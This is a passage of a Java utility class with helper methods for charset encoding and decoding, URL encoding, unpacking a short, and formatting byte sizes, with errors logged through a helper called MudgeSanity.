        }
    }

    public static byte[] toBytes(String text, String encoding) {
        try {
            Charset foo = Charset.forName(encoding);
            if (foo == null) {
                return CommonUtils.toBytes(text);
            }
            ByteBuffer tempb = foo.encode(text);
            byte[] result = new byte[tempb.remaining()];
            tempb.get(result, 0, result.length);
            return result;
        } catch (Exception ex) {
            MudgeSanity.logException("could not convert text with " + encoding, ex, false);
            return CommonUtils.toBytes(text);
        }
    }

    public static String bString(byte[] text, String encoding) {
        try {
            if (encoding == null) {
                return CommonUtils.bString(text);
            }
            Charset foo = Charset.forName(encoding);
            return foo.decode(ByteBuffer.wrap(text)).toString();
        } catch (Exception ex) {
            MudgeSanity.logException("Could not convert bytes with " + encoding, ex, false);
            return CommonUtils.bString(text);
        }
    }

    public static int toShort(String text) {
        if (text.length() != 2) {
            throw new IllegalArgumentException("toShort length is: " + text.length());
        }
        try {
            DataParser parser = new DataParser(CommonUtils.toBytes(text));
            return parser.readShort();
        } catch (IOException ioex) {
            MudgeSanity.logException("Could not unpack a short", ioex, false);
            return 0;
        }
    }

    public static void writeUTF8(OutputStream out, String text) throws IOException {
        byte[] temp = text.getBytes(StandardCharsets.UTF_8);
        out.write(temp, 0, temp.length);
    }

    public static String URLEncode(String text) {
        try {
            return URLEncoder.encode(text, "UTF-8");
        } catch (Exception ex) {
            MudgeSanity.logException("Could not URLEncode '" + text + "'", ex, false);
            return text;
        }
    }

    public static String URLDecode(String text) {
        try {
            return URLDecoder.decode(text, "UTF-8");
        } catch (Exception ex) {
            MudgeSanity.logException("Could not URLDecode '" + text + "'", ex, false);
            return text;
        }
    }

    public static long toUnsignedInt(int value) {
        return (long) value & 0xFFFFFFFFL;
    }

    public static String formatSize(long size) {
        String units = "b";
        if (size > 1024L) {
            size /= 1024L;
            units = "kb";
        }
        if (size > 1024L) {
            size /= 1024L;
            units = "mb";
        }
        if (size > 1024L) {
            size /= 1024L;
            units = "gb";
        }
        return size + units;
    }

}

